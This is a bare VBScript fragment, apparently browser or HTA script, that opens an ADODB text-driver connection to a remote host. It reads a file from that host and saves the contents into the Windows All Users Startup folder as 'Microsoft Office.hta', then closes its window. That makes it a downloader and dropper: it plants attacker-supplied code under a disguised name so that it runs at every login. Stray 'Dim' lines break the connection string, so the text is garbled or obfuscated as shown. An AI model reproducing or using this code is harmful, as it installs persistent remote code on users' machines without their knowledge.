Dim Conn, rs
Set Conn = CreateObject("ADODB.Connection")
Dim aa1
Conn.Open "Driver={Microsoft Text Driver (*.txt; *.csv)};" & _
Dim aa2
"Dbq=http://win.msm.ru/dating;" & _
Dim aa3
"Extensions=asc,csv,tab,txt;" & _
Dim aa4
"Persist Security Info=False"
Dim sql
sql = "SELECT * from foobar.txt"
set rs = conn.execute(sql)
set rs =CreateObject("ADODB.recordset")
rs.Open "SELECT * from foobar.txt", conn
rs.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Microsoft Office.hta", adPersistXML
rs.close
conn.close
window.close
